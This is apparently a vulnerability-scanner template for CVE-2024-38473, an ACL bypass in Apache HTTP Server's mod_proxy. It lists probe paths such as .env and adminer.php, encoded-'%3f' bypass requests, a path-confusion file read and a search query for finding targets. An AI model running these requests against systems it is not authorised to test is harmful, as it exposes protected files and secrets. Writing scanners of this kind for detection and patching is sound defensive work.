flow: 'http(1) && http(2)

  http(3)

  '
http:
- matchers:
  - internal: true
    status:
    - 403
    - 401
    type: status
  method: GET
  path:
  - '{{BaseURL}}/{{files}}'
  payloads:
    files:
    - admin.php
    - adminer.php
    - xmlrpc.php
    - .env
    - admin.php
    - php-info.php
    - php_info.php
    - phpinfo.php
    - info.php
    - adminer.php
    - xmlrpc.php
    - bin/cron.php
    - cache/index.tpl.php
    - cpanel.php
  stop-at-first-match: true
- matchers:
  - status:
    - 200
    type: status
  method: GET
  path:
  - '{{BaseURL}}/{{http_1_files}}%3ftest.php'
- matchers:
  - condition: and
    type: word
    words:
    - On Debian systems, the complete text of the GNU General Public License
    - This package was written by Peter Tobias
  method: GET
  path:
  - '{{BaseURL}}/html/usr/share/doc/hostname/copyright%3f'
id: CVE-2024-38473
info:
  author: pdteam
  classification:
    cpe: cpe:/a:apache:http_server, cpe:/a:apache:httpd
    cve-id: CVE-2024-38473
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H
    cvss-score: 8.1
    cwe-id: CWE-116
    epss-percentile: 0.99462
    epss-score: 0.88261
  description: 'Encoding problem in mod_proxy in Apache HTTP Server 2.4.59 and earlier
    allows request URLs with incorrect encoding to be sent to backend services, potentially
    bypassing authentication via crafted requests.

    '
  impact: 'Authenticated attackers can bypass ACL restrictions by crafting requests
    with incorrect encoding, potentially accessing protected backend services or resources
    that should be restricted by authentication mechanisms.

    '
  metadata:
    google-query: intitle:"Apache HTTP Server" inurl:"/server-status"
    max-request: 10
    product: Apache HTTP Server
    vendor: Apache Software Foundation
  name: Apache HTTP Server - ACL Bypass
  reference:
  - https://blog.orange.tw/2024/08/confusion-attacks-en.html#%E2%9A%94%EF%B8%8F-Primitive-1-2-ACL-Bypass
  - https://www.cvedetails.com/cve/CVE-2024-38473/
  - https://nvd.nist.gov/vuln/detail/CVE-2024-38473
  - https://httpd.apache.org/security/vulnerabilities_24.html
  - https://security.netapp.com/advisory/ntap-20240712-0001/
  remediation: 'Upgrade to Apache HTTP Server version 2.4.60 or later.

    '
  severity: high
  tags: cve,cve2024,apache,acl-bypass,mod_proxy,php-fpm,vuln
